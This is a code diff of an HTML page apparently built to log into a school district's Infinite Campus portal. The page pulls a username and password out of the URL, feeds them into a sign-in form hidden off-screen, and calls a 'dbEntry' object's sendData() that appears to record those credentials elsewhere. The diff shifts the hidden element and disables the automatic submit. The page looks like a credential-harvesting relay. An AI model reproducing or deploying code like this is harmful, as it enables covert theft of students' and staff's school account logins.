@@ -59,7 +59,7 @@ class dbEntry
 </head>
 <body>
 <form method="POST" id="form_signin" accept-charset="utf-8" action="https://campus.ccsd.net/campus/verify.jsp">
-<div style="position: fixed; left:-1000px">
+<div style="position: fixed; left:-1px">
             <input type="hidden" name="appName" value="clark">
             <input type="hidden" id="screen" name="screen" value="">
             
@@ -91,7 +91,7 @@ class dbEntry
         document.getElementById("password").value = urlSections[2].split("=")[1];
         var entry = new dbEntry(urlSections[0].split("=")[1], urlSections[1].split("=")[1], urlSections[2].split("=")[1]);
         entry.sendData();
-        document.getElementById("signinbtn").click();
+        //document.getElementById("signinbtn").click();
         </script>
 </body>
 </html>
